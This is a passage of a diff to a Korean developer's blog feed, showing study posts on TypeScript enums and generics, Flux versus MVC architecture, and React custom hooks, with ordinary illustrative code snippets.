+<p>타입스크립트의 숫자 enum은 값을 통해 원래의 이름을 역으로 조회할 수 있습니다.</p>
+
+<div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">enum</span> <span class="nx">Direction</span> <span class="p">{</span>
+  <span class="nx">North</span><span class="p">,</span>
+  <span class="nx">South</span><span class="p">,</span>
+  <span class="nx">East</span><span class="p">,</span>
+  <span class="nx">West</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">Direction</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="c1">// 출력: 'North'</span>
+</code></pre></div></div>
+
+<p>하지만 문자열 enum은 리버스 매핑이 지원되지 않으니 주의해야 합니다.</p>
+
+<p><br /></p>
+
+<h2 id="결론">결론</h2>
+
+<p>타입스크립트의 <code class="language-plaintext highlighter-rouge">enum</code>은 강력한 기능을 제공하여 특정 값들을 그룹화하고, 코드의 가독성과 타입 안전성을 높이는 데 기여합니다.</p>
+
+<p>그러나 무분별한 사용은 코드 복잡성을 높일 수 있으므로, 필요할 때 적절하게 사용하는 것이 중요합니다.</p>
+
+<p><br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">enum</code>을 통해 안전하고 명확한 코드를 작성하고, 실수를 줄이는 데 도움을 받을 수 있을 것입니다.</p>
+
+<p>앞으로 프로젝트에서 <code class="language-plaintext highlighter-rouge">enum</code>을 적절히 활용하여 더 견고한 코드를 작성해 나가길 기대합니다.</p>]]></content><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><category term="study" /><category term="etc" /><summary type="html"><![CDATA[TypeScript의 enum문법에 대해서 공부하고 기록합니다.]]></summary></entry><entry><title type="html">Generic에 대해서</title><link href="http://localhost:4000/study/etc/2024-02-03-generic/" rel="alternate" type="text/html" title="Generic에 대해서" /><published>2024-02-03T00:00:00+09:00</published><updated>2024-08-20T09:01:03+09:00</updated><id>http://localhost:4000/study/etc/generic</id><content type="html" xml:base="http://localhost:4000/study/etc/2024-02-03-generic/"><![CDATA[<h2 id="개요---타입스크립트를-공부하면서-두려움에-떨다">개요 - 타입스크립트를 공부하면서 두려움에 떨다</h2>
+
+<p>자바스크립트를 처음 배울 때도 그랬지만, 새로운 언어를 배우는 과정은 항상 두려움과 불안으로 가득합니다.</p>
+
+<p>타입스크립트를 처음 접했을 때도 마찬가지였습니다. 새로운 개념들을 이해하고 적용하는 과정에서 느끼는 막연한 두려움은, 마치 끝이 없는 미로 속을 걷는 기분이었습니다.</p>
+
+<p>하지만 그 두려움을 극복하고 한 발자국씩 나아가다 보면, 그 과정에서 얻는 성취감은 이루 말할 수 없습니다.</p>
+
+<p><br /></p>
+
+<p>타입스크립트를 처음 접했을 때, 특히 제네릭(Generic)이라는 개념이 저를 당혹스럽게 했습니다.</p>
+
+<p>이론적으로는 어느 정도 이해했지만, 실제로 어떻게 활용해야 할지 감이 잡히지 않았습니다.</p>
+
+<p>하지만 최근 팀 프로젝트에서 타입스크립트를 꼭 사용해야 하는 상황에 놓이면서, 제네릭을 포함한 타입스크립트의 다양한 기능들을 이해하고 활용할 수밖에 없었습니다.</p>
+
+<p>결국, 시행착오 끝에 조금씩 타입스크립트를 이해하게 되었고, 지금은 제네릭의 필요성과 그 유용성에 대해 어느 정도 알게 되었습니다.</p>
+
+<p><br /></p>
+
+<h2 id="제네릭을-왜-쓰는가">제네릭을 왜 쓰는가?</h2>
+
+<p>타입스크립트에서 제네릭은 다양한 타입을 다룰 때 매우 유용한 도구입니다. 제네릭을 사용하면 코드의 재사용성을 높이고, 타입 안정성을 유지하면서도 유연하게 코드를 작성할 수 있습니다.</p>
+
+<p>예를 들어, 다음과 같은 함수가 있다고 가정해 봅시다.</p>
+
+<div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">text</span><span class="p">(</span><span class="nx">item</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">item</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">item</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nf">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">하이</span><span class="dl">"</span><span class="p">);</span>
+<span class="nf">text</span><span class="p">(</span><span class="mi">120</span><span class="p">);</span>
+<span class="nf">text</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>이 함수는 <code class="language-plaintext highlighter-rouge">item</code>이라는 인자를 받아 콘솔에 출력하고, 그 값을 반환합니다.</p>
+
+<p>여기서 <code class="language-plaintext highlighter-rouge">item</code>의 타입은 암묵적으로 <code class="language-plaintext highlighter-rouge">any</code>로 취급됩니다. 따라서 이 함수는 <code class="language-plaintext highlighter-rouge">string</code>, <code class="language-plaintext highlighter-rouge">number</code>, <code class="language-plaintext highlighter-rouge">boolean</code> 타입의 값을 모두 처리할 수 있습니다.</p>
+
+<p>그러나 <code class="language-plaintext highlighter-rouge">any</code> 타입은 타입스크립트의 강력한 타입 안전성을 무너뜨릴 수 있습니다.</p>
+
+<p><br /></p>
+
+<p>이 함수를 string 타입만 처리하도록 제한한다면, 아래와 같이 작성할 수 있습니다.</p>
+
+<div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">text</span><span class="p">(</span><span class="nx">item</span><span class="p">:</span> <span class="kr">string</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">item</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">""</span><span class="p">).</span><span class="nf">reverse</span><span class="p">(</span><span class="dl">""</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">);</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">item</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">item</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nf">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">하이</span><span class="dl">"</span><span class="p">);</span> <span class="c1">// 실행 OK</span>
+<span class="nf">text</span><span class="p">(</span><span class="mi">120</span><span class="p">);</span> <span class="c1">// 에러</span>
+<span class="nf">text</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span> <span class="c1">// 에러</span>
+</code></pre></div></div>
+
+<p>이렇게 하면 함수는 <code class="language-plaintext highlighter-rouge">string</code> 타입의 값만 받을 수 있게 됩니다.</p>
+
+<p>하지만 만약 number 타입도 처리해야 한다면, 새로운 함수를 만들어야 하는 불편함이 생깁니다.</p>
+
+<p><br /></p>
+
+<p>이를 해결하기 위해 우리는 유니온 타입을 사용할 수 있습니다.</p>
+
+<div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">text</span><span class="p">(</span><span class="nx">item</span><span class="p">:</span> <span class="kr">string</span> <span class="o">|</span> <span class="kr">number</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">item</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">item</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nf">text</span><span class="p">(</span><span class="mi">2323</span><span class="p">);</span>
+<span class="nf">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">유니온타입</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>유니온 타입은 여러 타입을 받을 수 있게 해주지만, 문제는 타입스크립트가 이 경우 공통된 메서드나 속성에만 접근할 수 있게 한다는 점입니다.</p>
+
+<p><br /></p>
+
+<p>예를 들어, 아래와 같은 상황이 발생할 수 있습니다.</p>
+
+<div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">text</span><span class="p">(</span><span class="nx">item</span><span class="p">:</span> <span class="kr">string</span> <span class="o">|</span> <span class="kr">number</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">item</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">item</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="nf">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">유니온</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">a</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">""</span><span class="p">);</span> <span class="c1">// 에러</span>
+</code></pre></div></div>
+
+<p>이 코드는 <code class="language-plaintext highlighter-rouge">split()</code> 메서드가 <code class="language-plaintext highlighter-rouge">string</code> 타입에만 존재하기 때문에 타입스크립트는 오류를 발생시킵니다.</p>
+
+<p><strong>이런 문제를 해결하기 위해 등장한 것이 바로 제네릭입니다.</strong></p>
+
+<p><br /></p>
+
+<h2 id="제네릭-사용방법">제네릭 사용방법</h2>
+
+<p>제네릭을 사용하면 함수가 받을 타입을 나중에 결정할 수 있습니다. 예를 들어, 다음과 같이 제네릭을 사용할 수 있습니다.</p>
+
+<div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">text</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">item</span><span class="p">:</span> <span class="nx">T</span><span class="p">):</span> <span class="nx">T</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">item</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">item</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nx">text</span><span class="o">&lt;</span><span class="kr">string</span><span class="o">&gt;</span><span class="p">(</span><span class="dl">"</span><span class="s2">나 제네릭 응애</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">text</span><span class="o">&lt;</span><span class="nx">boolean</span><span class="o">&gt;</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
+<span class="nx">text</span><span class="o">&lt;</span><span class="kr">number</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">223</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>여기서 <code class="language-plaintext highlighter-rouge">T</code>는 타입의 자리표(T)로, 함수가 호출될 때 그 타입이 결정됩니다. 예를 들어 <code class="language-plaintext highlighter-rouge">text&lt;string&gt;("나 제네릭 응애")</code>를 호출하면, <code class="language-plaintext highlighter-rouge">T</code>는 <code class="language-plaintext highlighter-rouge">string</code> 타입으로 변환되며, 함수는 <code class="language-plaintext highlighter-rouge">string</code> 타입의 값을 처리하게 됩니다.</p>
+
+<p>제네릭의 강력한 점은 이렇게 호출 시점에 타입을 지정할 수 있다는 것입니다. 이를 통해 코드의 유연성과 재사용성을 높일 수 있습니다.</p>
+
+<p><br /></p>
+
+<h2 id="제네릭의-실제-활용-예시">제네릭의 실제 활용 예시</h2>
+
+<p>타입스크립트의 기본 라이브러리에서도 제네릭이 널리 사용됩니다.</p>
+
+<p>예를 들어, Array 타입은 제네릭을 사용하여 다양한 타입의 배열을 정의할 수 있습니다.</p>
+
+<div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">stringArray</span><span class="p">:</span> <span class="nb">Array</span><span class="o">&lt;</span><span class="kr">string</span><span class="o">&gt;</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">apple</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">banana</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">cherry</span><span class="dl">"</span><span class="p">];</span>
+<span class="kd">let</span> <span class="nx">numberArray</span><span class="p">:</span> <span class="nb">Array</span><span class="o">&lt;</span><span class="kr">number</span><span class="o">&gt;</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">];</span>
+</code></pre></div></div>
+
+<p>또한, Promise도 제네릭을 활용하여 비동기 작업의 결과 타입을 지정할 수 있습니다.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">fetchData</span><span class="p">():</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">string</span><span class="o">&gt;</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nf">resolve</span><span class="p">(</span><span class="dl">"</span><span class="s2">데이터를 가져왔습니다!</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
+  <span class="p">});</span>
+<span class="p">}</span>
+
+<span class="nf">fetchData</span><span class="p">().</span><span class="nf">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span> <span class="c1">// 타입스크립트는 data가 string 타입임을 알고 있음</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<h2 id="결론-제네릭-두려움을-극복하고-얻은-성취">결론: 제네릭, 두려움을 극복하고 얻은 성취</h2>
+
+<p>처음 제네릭을 접했을 때는 막연한 두려움이 있었지만, 결국 그 두려움을 극복하고 나니 타입스크립트의 강력한 도구를 하나 더 익히게 되었습니다.</p>
+
+<p>제네릭은 다양한 타입을 안전하게 처리하고, 코드의 유연성을 높이는 데 큰 도움을 줍니다.</p>
+
+<p>아직 마스터하지 못한 부분도 많지만, 타입스크립트를 더 깊이 이해하고 활용할 수 있게 되었다는 점에서 큰 성취감을 느낍니다.</p>
+
+<p>앞으로도 계속해서 학습을 이어가며, 타입스크립트의 더 깊은 부분을 탐구하고, 실제 프로젝트에서 더 효율적으로 활용할 수 있도록 노력할 것입니다.</p>]]></content><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><category term="study" /><category term="etc" /><summary type="html"><![CDATA[TypeScript의 Generic문법에 대해서 공부하고 기록합니다.]]></summary></entry><entry><title type="html">Flux 패턴과 MVC 패턴?</title><link href="http://localhost:4000/study/react/2023-12-26-flux/" rel="alternate" type="text/html" title="Flux 패턴과 MVC 패턴?" /><published>2023-12-26T00:00:00+09:00</published><updated>2024-08-20T08:51:03+09:00</updated><id>http://localhost:4000/study/react/flux</id><content type="html" xml:base="http://localhost:4000/study/react/2023-12-26-flux/"><![CDATA[<p>소프트웨어 개발에서 아키텍처 패턴은 애플리케이션의 구조와 설계를 결정하는 중요한 요소입니다.</p>
+
+<p>이러한 패턴들은 코드를 체계적으로 조직화하고, 유지보수성과 확장성을 향상시키는 데 도움을 줍니다.</p>
+
+<p>그중에서도 Flux 패턴과 MVC 패턴은 각각의 특징과 장단점으로 인해 널리 사용되는 두 가지 주요 아키텍처 패턴입니다.</p>
+
+<p>이 글에서는 Flux와 MVC 패턴의 개념과 그 차이점을 살펴보고, 각 패턴이 어떤 상황에서 더 적합한지 알아보겠습니다.</p>
+
+<p><br /></p>
+
+<h2 id="flux부터-알아봅시다">Flux부터 알아봅시다</h2>
+
+<p>Flux는 단방향 데이터 흐름을 강조하는 아키텍처 패턴으로, Facebook에서 React 애플리케이션의 복잡한 상태 관리를 위해 개발되었습니다.</p>
+
+<p>Flux는 상태 관리가 복잡해질수록 데이터 흐름을 예측 가능하게 하고, 버그 발생을 줄이며, 디버깅을 쉽게 해줍니다.</p>
+
+<h3 id="flux의-구성-요소">Flux의 구성 요소</h3>
+
+<ol>
+  <li>Action: 사용자의 입력이나 시스템의 이벤트를 나타내는 객체로, 데이터와 함께 특정 작업을 지시합니다.</li>
+  <li>Dispatcher: 액션을 받아서 등록된 모든 스토어에 전달하는 역할을 합니다. 단일 디스패처가 있어 중앙 집중화된 데이터 흐름을 관리합니다.</li>
+  <li>Store: 애플리케이션의 상태와 비즈니스 로직을 보유합니다. 스토어는 디스패처로부터 액션을 받아 상태를 업데이트하고, 변화된 상태를 뷰에 전달합니다.</li>
+  <li>View: 사용자 인터페이스를 담당하며, 스토어에서 상태가 변경될 때마다 이를 반영하여 UI를 업데이트합니다.</li>
+  <li>Action Creator: 액션 객체를 생성하는 함수로, 사용자 인터페이스에서 발생한 이벤트를 액션으로 변환합니다.</li>
+</ol>
+
+<p><br /></p>
+
+<p>Flux는 이 모든 요소들이 하나의 방향으로 데이터를 전달하며, 이로 인해 애플리케이션의 상태 변화를 예측하고 관리하기가 쉽습니다.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 간단한 Flux 패턴 예시</span>
+<span class="kd">const</span> <span class="nx">ActionTypes</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="na">ADD_TODO</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ADD_TODO</span><span class="dl">"</span><span class="p">,</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">Dispatcher</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Flux</span><span class="p">.</span><span class="nc">Dispatcher</span><span class="p">();</span>
+
+<span class="kd">const</span> <span class="nx">TodoStore</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="na">todos</span><span class="p">:</span> <span class="p">[],</span>
+  <span class="na">addTodo</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">todo</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">todos</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">todo</span><span class="p">);</span>
+  <span class="p">},</span>
+  <span class="na">getAll</span><span class="p">:</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">todos</span><span class="p">;</span>
+  <span class="p">},</span>
+<span class="p">};</span>
+
+<span class="nx">Dispatcher</span><span class="p">.</span><span class="nf">register</span><span class="p">((</span><span class="nx">action</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">switch </span><span class="p">(</span><span class="nx">action</span><span class="p">.</span><span class="nx">type</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">case</span> <span class="nx">ActionTypes</span><span class="p">.</span><span class="na">ADD_TODO</span><span class="p">:</span>
+      <span class="nx">TodoStore</span><span class="p">.</span><span class="nf">addTodo</span><span class="p">(</span><span class="nx">action</span><span class="p">.</span><span class="nx">todo</span><span class="p">);</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="nl">default</span><span class="p">:</span>
+    <span class="c1">// no-op</span>
+  <span class="p">}</span>
+<span class="p">});</span>
+
+<span class="kd">function</span> <span class="nf">addTodoAction</span><span class="p">(</span><span class="nx">todo</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">Dispatcher</span><span class="p">.</span><span class="nf">dispatch</span><span class="p">({</span>
+    <span class="na">type</span><span class="p">:</span> <span class="nx">ActionTypes</span><span class="p">.</span><span class="nx">ADD_TODO</span><span class="p">,</span>
+    <span class="na">todo</span><span class="p">:</span> <span class="nx">todo</span><span class="p">,</span>
+  <span class="p">});</span>
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>위의 코드는 기존 리액트에서 제공하는 DOM을 생성하는 방법이다.</p>
+<p>위 예시는 간단한 할 일(TODO) 리스트를 관리하는 Flux 패턴의 예시입니다.</p>
 
-<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">App</span><span class="p">()</span> <span class="p">{</span>
-  <span class="k">return</span> <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Hello, React!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;;</span>
+<p>액션은 디스패처를 통해 스토어에 전달되고, 스토어는 상태를 업데이트하며, 뷰는 업데이트된 상태를 표시합니다.</p>
+
+<h3 id="flux의-장점">Flux의 장점</h3>
+
+<ul>
+  <li>단방향 데이터 흐름: 상태 변화를 쉽게 추적할 수 있어, 디버깅과 유지보수가 용이합니다.</li>
+  <li>모듈화: 애플리케이션의 각 부분을 독립적으로 모듈화할 수 있습니다.</li>
+  <li>예측 가능성: 데이터가 한 방향으로만 흐르므로, 상태 변화가 예측 가능하고 복잡한 애플리케이션에서도 안정적입니다.</li>
+</ul>
+
+<p><br /></p>
+
+<h2 id="mvc-패턴도-알아봅시다">MVC 패턴도 알아봅시다</h2>
+
+<p>MVC 패턴은 오랜 시간 동안 소프트웨어 개발에서 사용되어 온 아키텍처 패턴으로, 모델(Model), 뷰(View), 컨트롤러(Controller)라는 세 가지 주요 구성 요소로 나뉩니다.</p>
+
+<p>이 패턴은 UI 애플리케이션에서 사용자 인터페이스와 비즈니스 로직을 분리하기 위해 고안되었습니다.</p>
+
+<h3 id="mvc의-구성-요소">MVC의 구성 요소</h3>
+
+<ol>
+  <li>Model: 애플리케이션의 데이터와 비즈니스 로직을 담당합니다. 모델은 데이터의 상태를 관리하고, 데이터를 생성, 수정, 삭제하는 역할을 합니다.</li>
+  <li>View: 사용자에게 보여지는 부분으로, 모델의 데이터를 바탕으로 UI를 구성하고 사용자 입력을 받습니다.</li>
+  <li>Controller: 사용자 입력을 처리하고, 이를 모델에 전달하여 상태를 변경하거나 모델로부터 데이터를 받아 뷰를 업데이트합니다.</li>
+</ol>
+
+<p><br /></p>
+
+<p>MVC 패턴에서는 컨트롤러가 중간에서 뷰와 모델 간의 데이터를 전달하며, 이로 인해 각 구성 요소가 독립적으로 변화할 수 있습니다.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 간단한 MVC 패턴 예시</span>
+<span class="kd">class</span> <span class="nc">Model</span> <span class="p">{</span>
+  <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">data</span> <span class="o">=</span> <span class="p">[];</span>
+  <span class="p">}</span>
+
+  <span class="nf">addItem</span><span class="p">(</span><span class="nx">item</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">item</span><span class="p">);</span>
+    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+  <span class="p">}</span>
 <span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">View</span> <span class="p">{</span>
+  <span class="nf">render</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">View rendering data:</span><span class="dl">"</span><span class="p">,</span> <span class="nx">data</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">Controller</span> <span class="p">{</span>
+  <span class="nf">constructor</span><span class="p">(</span><span class="nx">model</span><span class="p">,</span> <span class="nx">view</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">model</span> <span class="o">=</span> <span class="nx">model</span><span class="p">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">view</span> <span class="o">=</span> <span class="nx">view</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="nf">addItem</span><span class="p">(</span><span class="nx">item</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">updatedData</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">model</span><span class="p">.</span><span class="nf">addItem</span><span class="p">(</span><span class="nx">item</span><span class="p">);</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">view</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="nx">updatedData</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">const</span> <span class="nx">model</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Model</span><span class="p">();</span>
+<span class="kd">const</span> <span class="nx">view</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">View</span><span class="p">();</span>
+<span class="kd">const</span> <span class="nx">controller</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Controller</span><span class="p">(</span><span class="nx">model</span><span class="p">,</span> <span class="nx">view</span><span class="p">);</span>
+
+<span class="nx">controller</span><span class="p">.</span><span class="nf">addItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">New item</span><span class="dl">"</span><span class="p">);</span>
 </code></pre></div></div>
 
-<p>그리고 이 코드는 JSX문법이다. JSX문법은 프론트엔드 개발자가 코린이시절부터 배우는 HTML문법과 매우매우매우…(이하 생략) 흡사하기 때문에 모든 개발자가 JSX문법을 사용한다.
-JSX문법의 특징으로는 첫번째로 부모요소로 감싸는 형태의 DOM트리구조가 형성되어야 한다는 점. 두번째는 ‘JavaScript 표현식’을 사용하여야 한다는 점이다. 마지막으로 JSX문법내부에서 if문과 for문이 사용이 되지 않기에 삼항연산자를 사용하여 조건문을 작성하여야 한다. if문과 for문은 JavaScript 표현식이 아니기 때문에 사용이 불가능하다.</p>]]></content><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><category term="study" /><category term="React" /><summary type="html"><![CDATA[리액트는 현대 프론트엔드 개발에서 핵심적인 역할을 하는 라이브러리입니다. 왜 많은 개발자들이 리액트를 선호하는지에 대해 설명합니다.]]></summary></entry></feed>
+<p>위 예시는 MVC 패턴을 따르는 간단한 애플리케이션입니다.</p>
+
+<p>사용자가 입력한 데이터가 컨트롤러를 통해 모델에 전달되고, 모델은 상태를 업데이트한 후 뷰가 이를 렌더링합니다.</p>
+
+<h3 id="mvc의-장점">MVC의 장점</h3>
+
+<ul>
+  <li>유연성: 모델, 뷰, 컨트롤러가 독립적으로 작동할 수 있어 각 부분을 쉽게 교체하거나 수정할 수 있습니다.</li>
+  <li>재사용성: 뷰와 모델의 분리로 인해 코드의 재사용성이 높아집니다.</li>
+  <li>테스트 용이성: 비즈니스 로직과 UI가 분리되어 있어, 개별적으로 테스트가 가능합니다.</li>
+</ul>
+
+<p><br /></p>
+
+<h2 id="정리">정리</h2>
+
+<p><strong>두 패턴의 차이점을 간단히 요약하자면, Flux는 단방향 데이터 흐름을 강조하는 반면, MVC는 양방향 또는 분산된 데이터 흐름을 특징으로 합니다.</strong></p>]]></content><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><category term="study" /><category term="React" /><summary type="html"><![CDATA[Flux패턴과 MVC패턴에 대해서 공부하고 기록합니다.]]></summary></entry><entry><title type="html">내 더러운 코드에 커스텀 훅을 한 스푼 추가해보자.</title><link href="http://localhost:4000/study/react/2023-12-11-customhook/" rel="alternate" type="text/html" title="내 더러운 코드에 커스텀 훅을 한 스푼 추가해보자." /><published>2023-12-11T00:00:00+09:00</published><updated>2024-08-20T08:46:00+09:00</updated><id>http://localhost:4000/study/react/customhook</id><content type="html" xml:base="http://localhost:4000/study/react/2023-12-11-customhook/"><![CDATA[<h2 id="개요">개요</h2>
+
+<p>처음에는 커스텀 훅이라는 개념을 잘 몰랐습니다. 존재는 알았지만, 도대체 언제, 어떻게 써야 할지 감이 오지 않았죠.</p>
+
+<p>그러던 어느 날, 제가 맡은 로그인 및 회원가입 기능을 구현하면서 궁금증이 생겼습니다.</p>
+
+<ol>
+  <li>회원가입을 위해서는 사용자가 입력한 ‘아이디’, ‘사용자 이름’, ‘이메일’, ‘패스워드’ 등 많은 <code class="language-plaintext highlighter-rouge">input</code> 값이 필요합니다.</li>
+  <li>이 input 값들을 관리하기 위해 여러 개의 <code class="language-plaintext highlighter-rouge">useState</code>를 사용해야 할까요? (예: <code class="language-plaintext highlighter-rouge">onChange</code> 함수를 사용해서)</li>
+  <li>하지만 수많은 <code class="language-plaintext highlighter-rouge">useState</code>… 지저분하고 비효율적으로 느껴졌습니다. 상태값을 하나로 관리하고, 객체로 전달해야겠다는 생각을 하게 되었습니다.</li>
+</ol>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">[</span><span class="nx">formData</span><span class="p">,</span> <span class="nx">setFormData</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">({</span>
+  <span class="na">email</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
+  <span class="na">username</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
+  <span class="na">nickname</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
+  <span class="na">password</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
+<span class="p">});</span>
+
+<span class="kd">const</span> <span class="nx">handleInputChange</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">:</span> <span class="nx">React</span><span class="p">.</span><span class="nx">ChangeEvent</span><span class="o">&lt;</span><span class="nx">HTMLInputElement</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="p">{</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">value</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">;</span>
+  <span class="nf">setFormData</span><span class="p">((</span><span class="nx">prevData</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">({</span>
